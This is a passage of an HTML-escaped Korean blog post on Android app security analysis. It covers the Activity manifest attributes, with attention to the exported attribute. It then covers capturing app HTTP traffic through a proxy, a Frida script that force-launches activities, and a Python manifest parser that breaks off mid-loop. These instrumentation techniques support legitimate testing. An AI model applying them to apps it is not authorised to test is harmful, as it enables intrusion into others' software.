                                     &lt;span class=&quot;err&quot;&gt;&quot;landscape&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;portrait&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                                     &lt;span class=&quot;err&quot;&gt;&quot;reverseLandscape&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;reversePortrait&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                                     &lt;span class=&quot;err&quot;&gt;&quot;sensorLandscape&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;sensorPortrait&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                                     &lt;span class=&quot;err&quot;&gt;&quot;userLandscape&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;userPortrait&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                                     &lt;span class=&quot;err&quot;&gt;&quot;sensor&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;fullSensor&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;nosensor&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                                     &lt;span class=&quot;err&quot;&gt;&quot;user&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;fullUser&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;locked&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:showForAllUsers=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:stateNotNeeded=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:supportsPictureInPicture=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:taskAffinity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;string&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:theme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;resource or theme&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:uiOptions=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;none&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;splitActionBarWhenNarrow&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:windowSoftInputMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;stateUnspecified&quot;,&lt;/span&gt;
                                       &lt;span class=&quot;err&quot;&gt;&quot;stateUnchanged&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;stateHidden&quot;,&lt;/span&gt;
                                       &lt;span class=&quot;err&quot;&gt;&quot;stateAlwaysHidden&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;stateVisible&quot;,&lt;/span&gt;
                                       &lt;span class=&quot;err&quot;&gt;&quot;stateAlwaysVisible&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;adjustUnspecified&quot;,&lt;/span&gt;
                                       &lt;span class=&quot;err&quot;&gt;&quot;adjustResize&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;adjustPan&quot;]&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;   
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì´ ìˆ˜ë§ì€ attributeë¥¼ ì§€ì •í•  ìˆ˜ ìˆëŠ”ë°, ì£¼ëª©í•´ì•¼í•  attrì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;android:exported&lt;/code&gt; ì…ë‹ˆë‹¤. í•´ë‹¹ attributeê°€ ì„¤ì •ë˜ì—ˆë‹¤ë©´, ì™¸ë¶€ì—ì„œ intentë¥¼ í†µí•œ attribute í˜¸ì¶œ í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë‚´ë¶€ì—ì„œ intentë¥¼ í†µí•´ Activity ì „í™˜ì„ í•´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;ì™¸ë¶€-ìš”ì²­http-íŒ¨í‚·-íšë“ë°©ë²•&quot;&gt;ì™¸ë¶€ ìš”ì²­(HTTP) íŒ¨í‚· íšë“ë°©ë²•&lt;/h2&gt;

&lt;p&gt;ì œì¼ ë¨¼ì € ë– ì˜¬ë¦´ ìˆ˜ ìˆëŠ” ë°©ë²•ìœ¼ë¡œ burp suiteë‚˜ fiddlerì˜ ì¸ì¦ì„œë¥¼  ì‹œìŠ¤í…œ ì¸ì¦ì„œë¡œ ë“±ë¡í•œ ì´í›„, Proxyë¥¼ ì„¤ì •í•´ ëª¨ë“  ê¸°ëŠ¥ë“¤ì„ ìˆ˜ë™ìœ¼ë¡œ ì™¸ë¶€ ìš”ì²­ì„ ë°œìƒì‹œì¼œ ë¡œê¹…í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ìˆ˜ë§ì€ ê¸°ëŠ¥ë“¤ì´ ì¡´ì¬í•  ê²½ìš°, ì–´ëŠì •ë„ì˜ ìë™í™”ê°€ í•„ìš”í•©ë‹ˆë‹¤. ì•„ë˜ëŠ” ìë™í™”ì— ëŒ€í•œ ì•„ì´ë””ì–´ ì„¸ ê°€ì§€ë¥¼ ì œì‹œí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Intentë¥¼ í†µí•´ Activity ì „í™˜ ì‹œ ë°œìƒí•˜ëŠ” ì™¸ë¶€ ìš”ì²­ íŒ¨í‚· ë¡œê¹…
2. adbë¥¼ í†µí•´ Activity ì „í™˜ ì‹œ ë°œìƒí•˜ëŠ” ì™¸ë¶€ ìš”ì²­ íŒ¨í‚· ë¡œê¹…
3. Component ì´ë²¤íŠ¸ ì²˜ë¦¬ì‹œ ë°œìƒí•˜ëŠ” ì™¸ë¶€ ìš”ì²­ íŒ¨í‚· ë¡œê¹…
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;1-intentë¥¼-í†µí•´-activity-ì „í™˜-ì‹œ-ë°œìƒí•˜ëŠ”-ì™¸ë¶€-ìš”ì²­-íŒ¨í‚·-ë¡œê¹…&quot;&gt;1. Intentë¥¼ í†µí•´ Activity ì „í™˜ ì‹œ ë°œìƒí•˜ëŠ” ì™¸ë¶€ ìš”ì²­ íŒ¨í‚· ë¡œê¹…&lt;/h3&gt;

&lt;p&gt;Intentë¥¼ ë°œìƒì‹œí‚¤ê¸° ìœ„í•´ì„œëŠ” ì½”ë“œ ë‚´ì—ì„œ startActivityí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì•¼í•©ë‹ˆë‹¤. ë”°ë¼ì„œ, fridaë¥¼ ì‚¬ìš©í•˜ì—¬ ì²˜ë¦¬í•  ìˆ˜ ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ëŠ” ê·¸ ì˜ˆì‹œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// intent ë°œìƒì‹œí‚¤ëŠ” frida ì½”ë“œ&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActivityThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;android.app.ActivityThread&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActivityThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;currentApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getApplicationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getAllActivities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wait&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;callActivity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;activityName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;intent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;android.content.Intent&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;activityName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FLAG_ACTIVITY_NEW_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FLAG_ACTIVITY_CLEAR_TOP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FLAG_ACTIVITY_SINGLE_TOP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startActivity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•´ë‹¹ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ activityë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆê²Œ ë˜ì—ˆì§€ë§Œ, ë³´í†µ ì•±ì—ì„œëŠ” ì—¬ëŸ¬ íŒŒë¼ë¯¸í„°(Action, Category, Extra)ë¥¼ ì„¤ì •í•´ì•¼ ì •ìƒì ìœ¼ë¡œ activityê°€ ì´ë²¤íŠ¸ë¥¼ ì²˜ë¦¬í•˜ë„ë¡ ë˜ì–´ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ëª¨ë“  Activityì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;Action/Category&lt;/code&gt; ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ AndroidManifest.xmlë¥¼ íŒŒì‹±í•´ì•¼í•©ë‹ˆë‹¤. ì•„ë˜ëŠ” AndroidManifest.xmlë¥¼ íŒŒì‹±í•˜ì—¬ frida scriptë¡œ ì „ë‹¬í•˜ëŠ” ì½”ë“œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# androidmanifest.xml íŒŒì‹± -&amp;gt; frida script ì½”ë“œ
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;frida&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;xml.etree.ElementTree&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;run.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Usage] python run.py [androidmanifest.xml]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;on_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;send&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;activities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;activities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;manifest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;manifest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attrib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;package&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;manifest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;android&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res/android&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attrib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;{{&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
